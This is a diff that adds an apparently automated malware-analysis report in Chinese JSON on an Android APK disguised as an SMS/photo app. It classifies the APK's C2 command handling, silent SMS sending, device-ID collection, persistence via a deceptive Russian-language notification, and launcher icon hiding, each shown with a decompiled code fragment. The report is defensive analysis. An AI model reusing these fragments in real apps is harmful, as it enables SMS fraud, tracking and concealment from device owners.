@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "7b0e10c3e0fe6868a4fa6edc45d493d8f9f06a12cd1a7ba02693661d35fbf73e.apk",
+    "sha256": "7b0e10c3e0fe6868a4fa6edc45d493d8f9f06a12cd1a7ba02693661d35fbf73e",
+    "包名": "org.observation.peanut",
+    "应用名": "СМC - Фoтo",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 186.0
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\observation\\peanut\\HeadlineEconomy;",
+          "method_signature": "if(a(jSONObject, 1, 1, \"\", \"\", \"\")",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (i == 40) {\n    a(jSONObject.getString(\"text\"));\n}\nif (a(jSONObject, 1, 1, \"\", \"\", \"\")) {\n    new d(getApplicationContext(), 3).a(\"id\", string).a(\"command\", Integer.valueOf(i)).a(\"status\", Integer.valueOf(i3)).a(\"data\", jSONArray).a(\"post\", Boolean.valueOf(z)).a();\n}",
+          "malicious_code_snippet_context": "                  z = false;\n                  i3 = 0;\n              } else {\n>>>                 if (i == 40) {\n>>>                     a(jSONObject.getString(\"text\"));\n>>>                 }\n>>>                 z = false;\n>>>                 i3 = 0;\n>>>             }\n              if (a(jSONObject, 1, 1, \"\", \"\", \"\")) {\n                  new d(getApplicationContext(), 3).a(\"id\", string).a(\"command\", Integer.valueOf(i)).a(\"status\", Integer.valueOf(i3)).a(\"data\", jSONArray).a(\"post\", Boolean.valueOf(z)).a();\n              }",
+          "behavior_description": "代码从远程C2服务器接收JSON指令（jSONObject），解析command字段（如i==40时提取text内容执行），然后通过d类构建网络请求，将命令执行状态（command、status、data、post等字段）回传给C2服务器，形成完整的指令接收→执行→状态上报的C2通信闭环。d类是一个网络请求封装类，通过链式调用.a(key,value)构建请求参数，最终.a()执行发送。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\observation\\peanut\\a;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Soil.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在用户无感知的情况下静默发送短信，目标号码(str)和短信内容(str2)均由外部参数传入，异常被空catch块静默吞掉以避免暴露发送行为，典型用于短信欺诈、付费短信订阅或恶意链接传播。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\observation\\peanut\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) { return Settings.Secure.getString(context.getContentResolver(), \"android_id\"); }",
+          "malicious_code_snippet_context": "public static String c(Context context) { return Settings.Secure.getString(context.getContentResolver(), \"android_id\"); }",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 读取系统属性 android_id，获取设备唯一标识符用于设备指纹采集。android_id 是设备级标识，可用于跨应用追踪用户。在已确认的恶意样本中，该标识符通常被收集后上报至C2服务器用于受害者追踪与设备画像。数据流向：Settings.Secure.getString(ContentResolver, \"android_id\") → 返回给调用方（疑似后续网络外传）",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\observation\\peanut\\Candidate;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) { this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.observation.peanut.DINNER\", \"Beef\", 1)); builder = new Notification.Builder(getApplicationContext(), \"org.observation.peanut.DINNER\"); } else { builder = new Notification.Builder(getApplicationContext()); } builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocновнoй прoцеcс\").setContentText(\"Cиcтeма не корректнo рaбoтaет, вaм неoбхoдимо включить доcтуп к стaтистикe для 'Ocновнoй прoцеcс'\").setWhen(System.currentTimeMillis()); startForeground(110, builder.build());",
+          "malicious_code_snippet_context": "if (Build.VERSION.SDK_INT >= 26) { this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.observation.peanut.DINNER\", \"Beef\", 1)); builder = new Notification.Builder(getApplicationContext(), \"org.observation.peanut.DINNER\"); } else { builder = new Notification.Builder(getApplicationContext()); } builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocновнoй прoцеcс\").setContentText(\"Cиcтeма не корректнo рaбoтaет, вaм неoбхoдимо включить доcтуп к стaтистикe для 'Ocновнoй прoцеcс'\").setWhen(System.currentTimeMillis()); startForeground(110, builder.build());",
+          "behavior_description": "该代码通过startForeground启动前台服务实现保活持久化。关键在于其构造的通知内容具有欺骗性：通知标题伪装为'Основной процесс'（主进程），通知文本用俄语声称'系统工作不正常，您需要为主进程启用统计信息访问权限'，这是社会工程手段，诱导用户授予PACKAGE_USAGE_STATS等敏感权限。代码通过反射方式调用createNotificationChannel以规避直接依赖，属于隐蔽行为。该前台服务保活机制确保恶意进程持续运行，为后续恶意行为提供持久化基础。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\observation\\peanut\\Word;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Word.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class Word extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Word.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "代码通过调用 setComponentEnabledSetting 方法将应用的主组件（Word Activity）设置为禁用状态（参数2为 COMPONENT_ENABLED_STATE_DISABLED），导致应用图标在启动器中隐藏，随后调用 finish() 结束当前 Activity。此行为通常用于恶意软件在安装或启动后隐藏自身图标，避免被用户发现和卸载，以便在后台持续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
